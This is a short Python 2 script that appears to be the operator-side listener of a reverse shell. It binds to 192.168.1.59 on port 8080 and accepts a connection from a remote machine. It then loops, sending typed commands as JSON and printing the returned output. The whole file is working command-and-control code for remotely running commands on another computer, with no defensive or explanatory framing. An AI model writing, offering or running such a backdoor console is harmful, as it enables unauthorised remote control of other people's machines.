import socket
import json



class SocketListener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("listening on")
        (self.connection, address) = listener.accept()
        print("Connected from " + str(address))

    def json_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_recv(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)


    def command_interaction(self,command_input):
        self.json_send(command_input)
        return self.json_recv()

    def listening(self):
        while True:
            command_input = raw_input("enter command: ")
            command_output = self.command_interaction(command_input)
            print(command_output)

socket_listener = SocketListener("192.168.1.59",8080)
socket_listener.listening()
